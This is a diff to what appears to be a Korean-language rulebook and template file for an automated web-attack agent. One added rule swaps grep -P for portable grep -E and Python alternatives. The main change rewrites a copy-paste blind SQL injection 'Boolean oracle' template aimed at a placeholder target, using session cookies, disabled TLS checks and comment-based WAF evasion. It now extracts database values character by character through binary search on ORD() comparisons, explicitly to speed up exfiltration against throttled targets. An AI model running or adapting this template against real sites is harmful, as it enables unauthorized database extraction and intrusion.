@@ -423,6 +423,19 @@ RULE #12: curl 요청에 세션 쿠키 + 브라우저 헤더 반드시 포함 (W
     # STEP 2: 수집된 세션 쿠키로 공격 (s.cookies에 자동 저장됨)
     r = s.get("https://TARGET.com/page", params={"param": "PAYLOAD"}, verify=False, timeout=15)
 
+RULE #13: bash에서 grep 사용 시 반드시 호환 옵션 사용 (macOS/Linux 공통)
+  ❌ 절대 금지: grep -P (Perl regex) — macOS 기본 grep에서 "invalid option -- P" 에러
+  ✅ 대신 사용:
+    grep -oE "패턴"       → 확장 정규식 (macOS/Linux 모두 지원)
+    grep -E "패턴"        → 확장 정규식 매칭
+    sed -n "s/패턴/\1/p"  → 캡처 그룹 추출
+    python3 -c "import re,sys; [print(m) for m in re.findall(r'패턴', sys.stdin.read())]"
+
+  예시:
+    ❌ grep -oP "href=\"([^\"]+)\"" index.html
+    ✅ grep -oE 'href="[^"]+"' index.html | grep -oE '"[^"]+"' | tr -d '"'
+    ✅ python3 -c "import re,sys; [print(m) for m in re.findall(r'href=\"([^\"]+)\"', sys.stdin.read())]" < index.html
+
 === BOOLEAN ORACLE 필수 캘리브레이션 템플릿 (run_python 사용 시 복붙 필수) ===
 import requests, time, urllib3
 urllib3.disable_warnings()
@@ -481,20 +494,32 @@ while lo <= hi:
     else: hi = mid - 1
 print(f"길이: {extracted_len}자")
 
-# ── STEP 4: 문자 추출 ────────────────────────────────────────────────────
-CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-@."
+# ── STEP 4: 문자 추출 (이진탐색 — 선형탐색 금지, WAF 딜레이 환경 타임아웃 방지) ─
+# ⚠ 선형탐색 (for c in CHARSET) 은 글자당 최대 65요청 → 10자 추출에 650요청 → 타임아웃
+# ✅ 이진탐색은 글자당 최대 7요청 (log2(95)≈6.6) → 10자 추출에 70요청 → 빠름
 result = []
 for pos in range(1, extracted_len + 1):
-    found = False
-    for c in CHARSET:
-        cond = f"RIGHT(LEFT({expr},{pos}),1)=0x{ord(c):02x}"
+    lo_c, hi_c = 32, 126  # printable ASCII 범위
+    char_found = False
+    while lo_c <= hi_c:
+        mid_c = (lo_c + hi_c) // 2
+        # ASCII(char) >= mid_c 인지 확인
+        cond = f"ORD(RIGHT(LEFT({expr},{pos}),1))>={mid_c}"
         _, sz, _ = req(f"{BASE}/**/AND/**/{cond}")
-        time.sleep(0.2)
+        time.sleep(0.15)
         if is_true(sz):
-            result.append(c)
-            found = True
-            break
-    if not found: result.append("?")
+            # 정확히 mid_c인지 추가 확인
+            cond2 = f"ORD(RIGHT(LEFT({expr},{pos}),1))={mid_c}"
+            _, sz2, _ = req(f"{BASE}/**/AND/**/{cond2}")
+            time.sleep(0.15)
+            if is_true(sz2):
+                result.append(chr(mid_c))
+                char_found = True
+                break
+            lo_c = mid_c + 1
+        else:
+            hi_c = mid_c - 1
+    if not char_found: result.append("?")
     print(f"pos {pos}: {''.join(result)}")
 print(f"결과: {''.join(result)}")
 
